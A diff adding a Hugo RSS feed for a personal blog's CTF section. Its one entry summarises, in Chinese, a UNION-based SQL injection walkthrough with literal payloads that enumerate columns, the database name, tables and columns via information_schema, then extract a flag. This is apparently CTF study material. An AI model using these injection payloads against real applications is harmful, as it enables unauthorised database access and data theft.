@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ctfs on BLOG OF RTY</title>
+    <link>https://the-bao.github.io/ctf/</link>
+    <description>Recent content in Ctfs on BLOG OF RTY</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 10 Aug 2022 10:41:29 +0800</lastBuildDate><atom:link href="https://the-bao.github.io/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Sql注入</title>
+      <link>https://the-bao.github.io/ctf/sql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Wed, 10 Aug 2022 10:41:29 +0800</pubDate>
+      
+      <guid>https://the-bao.github.io/ctf/sql%E6%B3%A8%E5%85%A5/</guid>
+      <description>整数型注入与字符型注入 探测列数 order by 1,2,3 使用union select判断注入点 -1 union select 1,2 判断出回显位置后爆库 -1 union select 1,database() 拿到库名后开始爆表 -1&amp;rsquo; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 拿到表名后开始爆字段 -1&amp;rsquo; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;lsquo;flag&amp;rsquo;# 拿到字段后，开始爆字段内容 -1&amp;rsquo; union select 1,(select flag from flag)# </description>
+    </item>
+    
+  </channel>
+</rss>
